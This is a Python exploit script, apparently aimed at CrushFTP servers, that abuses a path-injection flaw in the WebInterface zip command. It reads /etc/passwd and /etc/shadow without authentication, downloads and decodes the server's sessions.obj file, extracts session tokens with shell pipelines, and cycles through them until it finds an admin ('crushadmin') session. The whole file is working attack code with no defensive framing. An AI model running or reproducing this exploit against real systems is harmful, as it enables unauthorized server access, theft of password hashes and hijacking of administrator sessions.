import requests
from io import BytesIO
import pycurl
import urllib3
import base64
import os
import argparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class bcolors:
    ENDC = '\033[0m'
    CEND      = '\33[0m'
    CBOLD     = '\33[1m'
    CITALIC   = '\33[3m'
    CURL      = '\33[4m'
    CBLINK    = '\33[5m'
    CBLINK2   = '\33[6m'
    CSELECTED = '\33[7m'

    CBLACK  = '\33[30m'
    CRED    = '\33[31m'
    CGREEN  = '\33[32m'
    CYELLOW = '\33[33m'
    CBLUE   = '\33[34m'
    CBEIGE2 = '\33[35m'
    CBEIGE  = '\33[36m'
    CWHITE  = '\33[37m'

    CGREY    = '\33[90m'
    CRED2    = '\33[91m'
    CGREEN2  = '\33[92m'
    CYELLOW2 = '\33[93m'
    CBLUE2   = '\33[94m'
    CVIOLET2 = '\33[95m'
    CBEIGE2  = '\33[96m'
    CWHITE2  = '\33[97m'


print(f"{bcolors.CRED}┌─┐┬┬─┐┌─┐  ┌┐┌┬ ┬┬  ┬  {bcolors.ENDC}")
print(f"{bcolors.CRED}├┤ │├┬┘├┤───││││ ││  │  {bcolors.ENDC}")
print(f"{bcolors.CRED}└  ┴┴└─└─┘  ┘└┘└─┘┴─┘┴─┘{bcolors.ENDC}")
print("         Author: j0x1nx")

parser = argparse.ArgumentParser(description='Fetch content from a URL.')
parser.add_argument('url', help='The URL to fetch content from')
args = parser.parse_args()
url = args.url
if url.endswith('/'):
    pass
else:
    url = f"{url}/"

def download_session(token,timeout=30):
    crush_auth_value = token.get('CrushAuth', None)
    current_auth_value = token.get('currentAuth', None)
    # Initialize pycurl
    c = pycurl.Curl()
# ?command=zip&c2f={current_auth_value}&path=<INCLUDE>sessions.obj</INCLUDE>&names=*
    # Set the URL
    c.setopt(pycurl.URL, f"{url}/WebInterface/function/?command=zip&c2f={current_auth_value}&path=<INCLUDE>sessions.obj</INCLUDE>&names=*")

    # Set custom cookie
    cookie = f"CrushAuth={crush_auth_value}; currentAuth={current_auth_value}"
    c.setopt(pycurl.COOKIE, cookie)

    # Ignore SSL certificate verification
    c.setopt(pycurl.SSL_VERIFYPEER, False)

    # Ignore SSL certificate host verification
    c.setopt(pycurl.SSL_VERIFYHOST, False)

    # Set timeout
    c.setopt(pycurl.CONNECTTIMEOUT, timeout)
    c.setopt(pycurl.TIMEOUT, timeout)

    # Create a buffer to store the response
    buffer = BytesIO()
    c.setopt(c.WRITEFUNCTION, buffer.write)

    try:
        # Perform the request
        c.perform()

        # Capture the output
        response = buffer.getvalue()

        # Encode response to base64
        response_base64 = base64.b64encode(response)
        # Save base64-encoded response to a file
        with open('rm.txt', "wb") as file:
            # Write the response in chunks
            for i in range(0, len(response_base64), 1024):
                file.write(response_base64[i:i+1024])

    except pycurl.error as e:
        # Handle curl errors
        error_code, error_message = e.args
        print(f"Error: {error_message}")

    # Close Curl object
    c.close()


def anonymous():

    session = requests.Session()
    r = session.get(f'{url}/WebInterface/function/?command=zip&c2f=ssss&path=<INCLUDE>/etc/passwd</INCLUDE>&names=*', verify=False)
    download_session(session.cookies.get_dict(), timeout=120)

anonymous()

def ext_sess():
    
    if os.path.exists('rm.txt'):
        os.system("cat rm.txt | base64 -d > sessions.obj")
    else:
       print("didn't find the session.obj file...")
       return 0 
    os.system("""strings sessions.obj | grep "127.0.0.1" | sed 's/9127.0.0.1_//' | sed 's/\;127.0.0.1_//' | sed 's/_^.*//' | grep -o '^[0-9]*_[a-zA-Z0-9]*' > sessions.txt""")

ext_sess()

def get_some():

    session = requests.Session()
    r = session.get(f'{url}/WebInterface/function/?command=zip&c2f=ssss&path=<INCLUDE>/etc/passwd</INCLUDE>&names=*', verify=False)
    t = session.cookies.get_dict()
    current_auth_value = t.get('currentAuth', None)
    l = session.get(f'{url}/WebInterface/function/?command=zip&c2f={current_auth_value}&path=<INCLUDE>/etc/shadow</INCLUDE>&names=*', verify=False)
    if "root:!" in l.text:
        print(l.text)


def get_access():
    
    if os.path.exists("sessions.txt"):
        pass
    else:
        crt = open("sessions.txt", "w")
        crt.close()
    file = open("sessions.txt", 'r')
    count = 0  # Initialize count before the loop
    for i in file:
        i = i.strip()  # Note the parentheses to call the method
        last_four_letters = i[-4:]
        headers = {'Cookie': "CrushAuth="+i , "currentAuth":last_four_letters}
        temp_url = f'{url}WebInterface/function/?command=getUsername&c2f={last_four_letters}'
        
        response = requests.get(temp_url, headers=headers, verify=False)  # Use verify=False to ignore SSL certificate verification
        count += 1  # Increment count for each token tried
        if "crushadmin" in response.text:
            print(f"[+] Found valid token: {i}, {last_four_letters}")
            break  # Exit the loop once a valid token is found
        else:
            print(f"[-] Tried token {count}")
    file.close()
    print("[-]did not found the token...")
    print("[+]dumping pass files...")
    get_some()
get_access()

